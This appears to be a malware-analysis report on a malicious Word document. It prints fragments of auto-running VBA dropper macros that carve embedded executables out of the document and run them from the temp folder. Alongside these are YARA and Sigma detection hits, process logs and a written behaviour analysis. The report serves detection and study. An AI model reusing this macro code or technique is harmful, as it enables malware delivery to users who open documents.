macros.vba_code:
Option Explicit

Dim o As String
Dim a As String
Dim b As String
Dim c As String
Dim d As String
Dim e As String
Dim f As String
Dim ff As String

Dim bcc(17) As Byte
Dim bb(17) As Byte

Dim s32 As String

Private Sub Document_Open()
    On Error Resume Next
    ActiveDocument.ActiveWindow.View.Type = wdPrintView
    ini bcc, bb
    w bcc, bb
    shapea
    s32 = "sys"
    t
End Sub

Sub t()

    Dim fso: Set fso = CreateObject("Scripting.Fil" & "eSystemObject")
    Dim oShell: Set oShell = CreateObject("WScript." & "Shell")
    Dim fcopy As String
    fcopy = o
    
    #If Win64 = 1 Then
        s32 = s32 & "te" & "m32"
    #ElseIf Win32 = 1 Then
        s32 = s32 & "na" & "tive"
    #End If
    
    Dim fname As String
    fname = VBA.Environ("temp") & "\" & fcopy
    
    fso.CopyFile ActiveDocument.Path & "\" & ActiveDocument.name, VBA.Environ("temp") & "\" & fcopy
    
    fso.CopyFile VBA.Environ(d) & "\" & s32 & "\" & a, VBA.Environ("temp") & "\" & a
    
    Dim fout1 As Strin
macros.properties: auto-close auto-open copy-file create-ole environ run-file

macros.vba_code:
Option Explicit

Function rb(file) As Byte()
    Dim stream: Set stream = CreateObject("ADODB.Stream")
    stream.Open
    stream.Type = 1
    stream.LoadFromFile (file)
    rb = stream.Read()
    stream.Close
End Function

Function wb(inFile, pos, outFile, size)
    Dim stream: Set stream = CreateObject("ADODB.Stream")
    Dim destStream: Set destStream = CreateObject("ADODB.Stream")
    destStream.Open
    destStream.Type = 1
    stream.Open
    stream.Type = 1
    stream.LoadFromFile (inFile)
    stream.Position = pos
    stream.CopyTo destStream, size
    stream.Close
    destStream.SaveToFile outFile, 2
    destStream.Close
End Function

Function sp(src() As Byte) As Long
    sp = -1
    If VBA.LenB(src) < 5 Then Exit Function
    
    Dim i As Long
    
    For i = 1 To VBA.LenB(src) - 5
        If (src(i) = &H4D) And (src(i + 1) = &H5A) And (src(i + 2) = &H90) Then
            sp = i
            Exit For
        End If
    Next
End Function

Sub w(bcc() As Byte, bb() As Byte)

Sub we(bcc() As Byte, bb() As Byte)
    Dim b_(2) As Byte
    Dim bb_(2) As Byte
    
    Dim i As Long
    For i = 0 To UBound(bcc) / 2
        bb_(0) = bcc(i * 2)
        bb_(1) = bcc(i * 2 + 1)
        b_(0) = bb(i * 2)
        b_(1) = bb(i * 2 + 1)
        
        With ActiveDocument.Content.Find
        .Execute FindText:=b_, ReplaceWith:=bb_, Replace:=wdReplaceAll, MatchCase:=msoTrue
        End With
    Next

End Sub

crowdsourced_yara_results.description: This signature detects the presence of a number of Windows API functionality often seen within embedded executables. When this signature alerts on an executable, it is not an indication of malicious behavior. However, if seen firing in other file types, deeper investigation may be warranted.
crowdsourced_yara_results.author: InQuest Labs

crowdsourced_yara_results.description: This signature detects an office document with an embedded VBA project. While this is fairly common it is sometimes used for malicious intent.
crowdsourced_yara_results.author: InQuest Labs

threat_severity.level_description: Severity HIGH because it was considered trojan. Other contributing factor was that it could not be run in sandboxes.

sigma_analysis_results.rule_title: File With Uncommon Extension Created By An Office Application
sigma_analysis_results.rule_description: Detects the creation of files with an executable or script extension by an Office application.
sigma_analysis_results.rule_author: Vadim Khrykov (ThreatIntel), Cyb3rEng (Rule), Nasreddine Bencherchali (Nextron Systems)

sigma_analysis_results.rule_description: Detects a suspicious process spawning from one of the Microsoft Office suite products (Word, Excel, PowerPoint, Publisher, Visio, etc.)
sigma_analysis_results.rule_author: Florian Roth (Nextron Systems), Markus Neis, FPT.EagleEye Team, Vadim Khrykov, Cyb3rEng, Michael Haag, Christopher Peacock @securepeacock, @scythe_io

match_context.values: @{Product=Microsoft\xae Windows\xae Operating System; CurrentDirectory=C:\Users\Bruno\Desktop\; OriginalFileName=clip.exe; Hashes=MD5=50F2CF199F2EB26D37403C9D7268D81F,SHA256=5AD606BCBBBDB95DDA19C955E4129B436295CAC249E2370FEE3D0285D387CF55,IMPHASH=D4F9D4B3E58F3C49F0B3042F0B20C802; Description=Clip - copies the data into clipboard; FileVersion=10.0.19041.1 (WinBuild.160101.0800); ParentCommandLine="C:\Program Files (x86)\Microsoft Office\Office16\WINWORD.EXE" "C:\Users\Bruno\Desktop\readme.doc" /q; CommandLine="C:\Users\Bruno\AppData\Local\Temp\clip.exe" ; EventID=1; ParentImage=C:\Program Files (x86)\Microsoft Office\Office16\WINWORD.EXE; IntegrityLevel=High; Image=C:\Users\Bruno\AppData\Local\Temp\clip.exe; Company=Microsoft Corporation}

sigma_analysis_results.rule_description: Detects an executable in the users directory started from one of the Microsoft Office suite applications (Word, Excel, PowerPoint, Publisher, Visio)

Detects the creation of a new office macro files on the systems

sigma_analysis_results.rule_title: Data Copied To Clipboard Via Clip.EXE
sigma_analysis_results.rule_description: Detects the execution of clip.exe in order to copy data to the clipboard. Adversaries may collect data stored in the clipboard from users copying information within or between applications.

match_context.values: @{Product=Microsoft\xae Windows\xae Operating System; CurrentDirectory=C:\Users\Bruno\Desktop\; OriginalFileName=clip.exe; Hashes=MD5=50F2CF199F2EB26D37403C9D7268D81F,SHA256=5AD606BCBBBDB95DDA19C955E4129B436295CAC249E2370FEE3D0285D387CF55,IMPHASH=D4F9D4B3E58F3C49F0B3042F0B20C802; Description=Clip - copies the data into clipboard; FileVersion=10.0.19041.1 (WinBuild.160101.0800); ParentCommandLine="C:\Program Files (x86)\Microsoft Office\Office16\WINWORD.EXE" "C:\Users\Bruno\Desktop\readme.doc" /q; CommandLine="C:\Users\Bruno\AppData\Local\Temp\clip.exe" ; EventID=1; ParentImage=C:\Program Files (x86)\Microsoft Office\Office16\WINWORD.EXE; IntegrityLevel=High; Image=C:\Users\Bruno\AppData\Local\Temp\clip.exe; Company=Microsoft Corporation}

crowdsourced_ai_results.analysis:
The macros begin execution upon document opening. The `Document_Open` subroutine sets the active window view type to `wdPrintView`, initializes two byte arrays `bcc` and `bb`, calls the `w` and `shapea` subroutines and sets the `s32` variable to "sys".

The `shapea` subroutine reads strings from the `AlternativeText` property of the first shape in the active document. These strings are assigned to global variables `a`, `b`, `c`, `d`, `e`, `f`, `o`, and `ff`.

The `w` subroutine iterates through the `bcc` and `bb` byte arrays, replacing byte sequences in the active document's content.

The `t` subroutine creates `FileSystemObject` and `WScript.Shell` objects. It copies the current document to the temp directory with a filename derived from the `o` global variable. It also copies a file from the system directory (either "system32" on 64-bit systems or "native" on 32-bit systems) to the temp directory, using the `a` global variable for the filename.

The macro then expands environment strings specified by the `e` and `f` global variables and constructs a path using the `ff` global variable, storing the results in `fout1`, `fout2`, and `fout3` respectively. File sizes are hardcoded into the variables `fsz1`, `fsz2`, `fsz3`.

It checks if the copied document exists in the temp directory. If it does, and if `fout1` does not exist, it reads the copied document into a byte array. If the size of the byte array exceeds the sum of `fsz1` and `fsz2`, it calls the `sp` function to find a specific byte sequence (MZ header) within the byte array. The `wb` function is then called three times to extract segments of the original document in the temp directory and save them into separate files located at `fout1`, `fout2`, and `fout3`. The lengths of the segments written to these files are equal to `fsz1`, `fsz2`, and `fsz3` respectively.
Finally, the macro executes the file located in the temp directory corresponding to global variable `a`.

The `Document_Close` subroutine initializes the `bcc` and `bb` byte arrays again and calls subroutine `we`. This subroutine performs similar replacements to `w` but it swaps `bcc` and `bb` arrays. It then executes two files from the system directory, based on the `b`, `c`, `d` and `s32` variables.

The provided macros exhibit several behaviors commonly associated with malicious intent. 

1. Obfuscation and Decoding: The macros utilize obfuscated variable names and functions, which is a common tactic to hide the true purpose of the code. For instance, the use of arrays `bcc` and `bb` appears to be part of an encoding/decoding mechanism, likely intended to manipulate or hide data.

2. File Operations: The macro contains functions that read from and write to files using `ADODB.Stream`, which is often used in malware to handle binary data. The function `rb(file)` reads bytes from a specified file, while `wb(inFile, pos, outFile, size)` writes a specific portion of a file to another location. This indicates potential file manipulation, which can be used for malicious purposes such as injecting payloads into legitimate files.

3. Execution of External Files: The line `oShell.Run VBA.Environ("temp") & "\" & a, 0, False` suggests that the macro attempts to execute a file located in the temporary directory. This could potentially lead to the execution of a malicious executable if the variable `a` is set to a harmful file name.

4. Persistence Mechanisms: The `Document_Open()` and `Document_Close()` subroutines indicate that the macro is designed to run automatically when the document is opened or closed. This behavior is characteristic of malware that seeks to maintain persistence on a system.

5. Manipulation of Document Content: The `w(bcc() As Byte, bb() As Byte)` and `we(bcc() As Byte, bb() As Byte)` functions replace text within the document based on the byte arrays. This could be used to alter the content of the document in a way that conceals malicious activity or misleads users.

6. Environment Variable Usage: The macro makes extensive use of environment variables (e.g., `VBA.Environ("temp")`), which is a technique often employed by malware to dynamically determine paths for file operations, making it harder to detect hardcoded paths.

7. Error Handling: The use of `On Error Resume Next` throughout the code suggests an attempt to suppress error messages, which is a common practice in malicious scripts to avoid detection during execution.

Overall, the combination of these factors strongly indicates that the macros are designed with malicious intent, aiming to manipulate files, execute potentially harmful code, and maintain persistence on the infected system.
